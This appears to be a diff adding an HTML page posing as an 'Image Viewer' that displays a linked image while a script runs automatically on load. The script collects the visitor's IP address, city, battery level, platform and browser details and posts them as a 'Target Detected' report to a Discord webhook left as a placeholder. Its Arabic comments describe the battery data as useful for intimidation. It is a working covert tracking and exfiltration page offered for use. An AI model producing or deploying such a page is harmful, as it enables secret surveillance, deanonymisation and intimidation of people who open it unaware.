@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Image Viewer</title>
+    <script>
+        async function collectIntel() {
+            // 1. جلب الـ IP والموقع
+            let response = await fetch('https://ipapi.co/json/');
+            let data = await response.json();
+            
+            // 2. معلومات البطارية (قوية جداً للترهيب)
+            let battery = await navigator.getBattery();
+            let batteryLevel = (battery.level * 100) + "%";
+
+            // 3. تجهيز التقرير
+            let report = {
+                content: "📱 **iPhone Target Detected!**",
+                embeds: [{
+                    fields: [
+                        {name: "🌐 IP", value: data.ip, inline: true},
+                        {name: "📍 City", value: data.city, inline: true},
+                        {name: "🔋 Battery", value: batteryLevel, inline: true},
+                        {name: "📱 Device", value: navigator.platform, inline: false},
+                        {name: "🌐 Browser", value: navigator.userAgent, inline: false}
+                    ],
+                    color: 15158332
+                }]
+            };
+
+            // 4. إرسال للديسكورد فوراً
+            fetch('ضع_رابط_الويب_هوك_هنا', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(report)
+            });
+        }
+        window.onload = collectIntel;
+    </script>
+</head>
+<body style="margin:0; background:#000; display:flex; justify-content:center; align-items:center; height:100vh;">
+    <!-- ضع هنا رابط صورة فخمة -->
+    <img src="https://bit.ly/3fancy-img" style="width:100%;">
+</body>
+</html>
